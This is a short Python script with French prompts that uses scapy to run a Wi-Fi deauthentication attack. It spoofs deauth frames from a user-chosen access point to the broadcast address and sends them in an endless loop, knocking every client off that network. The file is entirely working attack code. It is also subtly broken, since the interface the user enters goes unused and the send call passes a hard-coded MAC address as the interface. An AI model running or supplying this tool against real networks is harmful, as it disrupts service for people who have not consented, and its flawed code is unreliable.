from scapy.all import *
import sys
import os

print("Module de deauth: ")
interface=input("Veuillez entrer le nom de votre interface wifi (iwconfig pour la connaitre)")
AP_cible=input("veuillez entrer l'adresse du pont d'acces cible: ")
adresse_cible='ff:ff:ff:ff:ff:ff' #on attaque toutes les cibles
dot11 = Dot11(type=0,subtype=12,addr1=adresse_cible,addr2=AP_cible,addr3=AP_cible)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
while True:
	print("Envoi d'un paquet de deauth vers %s" %AP_cible)
	sendp(packet, IFACE='ca:0b:f9:37:bd:3f')
